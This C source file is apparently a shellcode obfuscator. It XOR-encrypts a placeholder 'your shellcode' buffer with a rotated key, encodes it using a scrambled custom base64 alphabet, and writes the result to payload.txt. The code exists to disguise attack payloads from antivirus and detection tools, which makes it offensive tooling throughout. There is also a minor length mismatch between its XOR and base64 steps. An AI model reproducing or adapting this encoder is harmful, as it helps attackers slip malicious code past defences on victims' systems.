#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static char base64_table[] = "i78NOPrstTUByz0defAg9jCXabcJKLV2uvwxYZklMh345WmnopDEFGHI16+/QRSq";
static char key[] = "Sqra0(3AeMhi7I16+/QR*)jCXabcJ79!Ag9OPrB&DEFGH45WmnopuvwxYZklstTUByz0defKLV238N";
static long base64_table_iv = 3333333;
static long key_iv = 99999999;
void base64_encode(unsigned char *input, int length, unsigned char *output) {
    int i, j;
    for (i = 0, j = 0; i < length;) {
        unsigned int octet_a = i < length ? input[i++] : 0;
        unsigned int octet_b = i < length ? input[i++] : 0;
        unsigned int octet_c = i < length ? input[i++] : 0;
        unsigned int triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        output[j++] = base64_table[(triple >> 18) & 0x3F];
        output[j++] = base64_table[(triple >> 12) & 0x3F];
        output[j++] = (i > length + 1) ? '=' : base64_table[(triple >> 6) & 0x3F];
        output[j++] = (i > length) ? '=' : base64_table[triple & 0x3F];
    }
    output[j] = '\0';
}

void adjust_first_to_last(char *array) {
    int length = strlen(array);
    if (length > 1) {
        char first_char = array[0];
        for (int i = 1; i < length; i++) {
            array[i - 1] = array[i];
        }
        array[length - 1] = first_char;
    }
}

void xor_encrypt_decrypt(unsigned char *input, unsigned char *output, char *key, int len) {
    int key_length = strlen(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key[i % key_length];
    }
    output[len] = '\0';
}

void write_string_to_file(const char *filename, const char *str) {
    FILE *file = fopen(filename, "w");
    if (file == NULL) {
        perror("Error opening file");
        return;
    }
    fprintf(file, "%s", str);
    fclose(file);
}

int main() {
    unsigned char buf[] = "your shellcode";
    unsigned char encoded[2048];
    unsigned char encrypted[2048];
    for(long i = 0; i<base64_table_iv % strlen(base64_table); i++){
        adjust_first_to_last(base64_table);
    }
    for(long i = 0; i<key_iv % strlen(key); i++){
        adjust_first_to_last(key);
    }
    xor_encrypt_decrypt(buf, encrypted, key, sizeof(buf) / sizeof(buf[0]) - 1);
    base64_encode(encrypted, sizeof(buf) / sizeof(buf[0]), encoded);
    write_string_to_file("payload.txt", encoded);
}